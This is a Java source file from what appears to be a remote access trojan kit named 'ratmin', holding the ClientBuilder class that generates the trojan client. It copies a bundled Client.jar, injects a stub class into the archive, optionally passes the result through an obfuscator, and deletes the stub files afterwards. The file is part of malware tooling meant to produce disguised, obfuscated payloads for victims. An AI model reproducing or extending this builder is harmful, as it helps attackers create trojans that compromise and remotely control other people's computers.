package me.slimig.ratmin.utils;

import me.slimig.ratmin.user_interface.Ratmin;

import javax.swing.*;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;

public class ClientBuilder {
    public void build(String filenameout, boolean obf) {
        InputStream jar = Ratmin.class.getResourceAsStream("/resources/Client.jar");
        Path jarpath = Paths.get(filenameout).toAbsolutePath();

        try {
            Files.copy(jar, jarpath, StandardCopyOption.REPLACE_EXISTING);
        } catch (IOException e1) {
            e1.printStackTrace();
        }
        File[] contents = {new File("DummyStub.class")};

        File jarFile = new File(filenameout);

        try {
            updateZipFile(jarFile, contents);
            if (obf == true) {
                Obfuscator.startObfuscator(filenameout);
            }
            JOptionPane.showMessageDialog(null, "   " + "   " + "   Client built!", "Success", 1);
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    public static void updateZipFile(File zipFile, File[] files) throws IOException {
        // get a temp file
        File tempFile = File.createTempFile(zipFile.getName(), null);
        // delete it, otherwise you cannot rename your existing zip to it.
        tempFile.delete();

        boolean renameOk = zipFile.renameTo(tempFile);
        if (!renameOk) {
            throw new RuntimeException(
                    "could not rename the file " + zipFile.getAbsolutePath() + " to " + tempFile.getAbsolutePath());
        }
        byte[] buf = new byte[1024];

        ZipInputStream zin = new ZipInputStream(new FileInputStream(tempFile));
        ZipOutputStream out = new ZipOutputStream(new FileOutputStream(zipFile));

        ZipEntry entry = zin.getNextEntry();
        while (entry != null) {
            String name = entry.getName();
            boolean notInFiles = true;
            for (File f : files) {
                if (f.getName().equals(name)) {
                    notInFiles = false;
                    break;
                }
            }
            if (notInFiles) {
                // Add ZIP entry to output stream.
                out.putNextEntry(new ZipEntry(name));
                // Transfer bytes from the ZIP file to the output file
                int len;
                while ((len = zin.read(buf)) > 0) {
                    out.write(buf, 0, len);
                }
            }
            entry = zin.getNextEntry();
        }
        // Close the streams
        zin.close();
        // Compress the files
        for (int i = 0; i < files.length; i++) {
            InputStream in = new FileInputStream(files[i]);
            // Add ZIP entry to output stream.
            out.putNextEntry(new ZipEntry(files[i].getName()));
            // Transfer bytes from the file to the ZIP file
            int len;
            while ((len = in.read(buf)) > 0) {
                out.write(buf, 0, len);
            }
            // Complete the entry
            out.closeEntry();
            in.close();
        }
        // Complete the ZIP file
        out.close();
        tempFile.delete();
        File classf = new File("DummyStub.class");
        File java = new File("DummyStub.java");
        if (classf.exists()) {
            classf.delete();
        }
        if (java.exists()) {
            java.delete();
        }
    }
}